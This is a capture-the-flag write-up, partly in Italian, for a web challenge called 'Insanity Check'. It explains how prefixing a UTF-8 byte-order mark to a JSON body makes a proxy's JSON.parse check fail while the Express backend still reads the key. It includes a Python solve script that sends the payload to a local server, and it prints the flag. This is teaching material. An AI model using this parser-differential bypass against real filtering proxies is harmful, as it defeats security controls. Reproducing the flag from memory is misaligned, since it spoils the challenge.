# Insanity Check

## Setup
```
cd build
docker compose up
```
Ora il sito è disponibile al link: [http://localhost:4567](http://localhost:4567).

## Descrizione
@benjamin ha scoperto i firewall???

Corri a fare first blood: [http://www.beginner.havce.it:8080](http://www.beginner.havce.it:8080).


*Author: [@benjamin](https://github.com/b3nj4m1no)*


## Soluzione
You should make a JSON that satisfies the following conditions:

* The `backend` server, i.e. a JSON parser of Express, recognizes it as a JSON containing a key `dammilaflag`.
* The `proxy` server fails to parse it as a JSON value at `JSON.parse(req.body)`.
  
In conclusion, the following JSON satisfies them where `\ufeff` is a BOM:
```js
\ufeff{"dammilaflag": true}
```

Web frameworks often allow JSON values to be added a BOM at the beginning. For example, Fastify and Express check a BOM at:

* Fastify: https://github.com/fastify/secure-json-parse/blob/v2.7.0/index.js#L20-L23
* Express: https://github.com/ashtuchkin/iconv-lite/blob/v0.6.3/lib/bom-handling.js#L39-L40

On the other hand, JSON.parse does not allow a BOM:
```js
> JSON.parse('{"dammilaflag": true}')
{ dammilaflag: true }
> JSON.parse('\ufeff{"dammilaflag": true}')
Uncaught SyntaxError: Unexpected token '', "{"dammil"... is not valid JSON
```

## Solve

```py
# Author: @benjamin

import requests

url = "http://localhost:4567"

payload = '\ufeff{"dammilaflag": true}'.encode('utf-8')  # UTF-8 BOM

r = requests.post(
    url,
    headers = {"Content-Type": "text/plain"},
    data = payload
)

print(r.text)
```

## Flag
`CodeVinciCTF{n3vEr_tRu5t_4_w4f_:drop_of_blood:}`
